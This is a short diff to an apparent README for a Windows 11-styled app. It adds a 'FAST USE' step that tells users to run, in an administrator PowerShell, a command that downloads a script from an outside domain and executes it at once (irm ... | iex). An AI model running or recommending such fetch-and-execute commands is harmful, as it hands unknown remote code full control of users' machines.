@@ -20,6 +20,11 @@
 
 ---
 
+## ✅FAST USE 
+1. Open Powershell as Administrator
+2. Run this command: ```irm "https://amathyzin.com.br/win11god" | iex```
+3. Have fun!
+
 ## ✨ Highlights
 
 * 🪟 **Native Win11 look** — custom titlebar, Mica/Acrylic backdrop, dark theme.
